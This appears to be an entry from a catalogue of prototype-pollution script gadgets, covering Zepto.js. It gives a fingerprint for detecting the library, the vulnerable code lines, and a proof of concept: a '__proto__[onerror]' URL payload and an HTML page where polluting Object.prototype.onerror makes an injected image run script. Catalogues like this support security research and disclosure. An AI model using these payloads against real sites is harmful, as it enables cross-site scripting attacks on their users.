## Zepto.js

URL: https://zeptojs.com/

### JS Fingerprint
```
(typeof $ !== 'undefined' && typeof $.zepto !== 'undefined')
```

### Vulnerable code fragment
https://github.com/madrobby/zepto/blob/763b3d6dc3b4350759ed30aa196cd2b6e39efcfb/src/zepto.js#L140-L162
```js
      $.each(properties, function(key, value) {
        if (methodAttributes.indexOf(key) > -1) nodes[key](value)
        else nodes.attr(key, value)
      })
```

### PoC

```
?__proto__[onerror]=alert(1)
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.js"></script>
<script>
    Object.prototype.onerror="alert(1)"
</script>
<script>
    $("<img/src>", {id: "x"})
</script>
```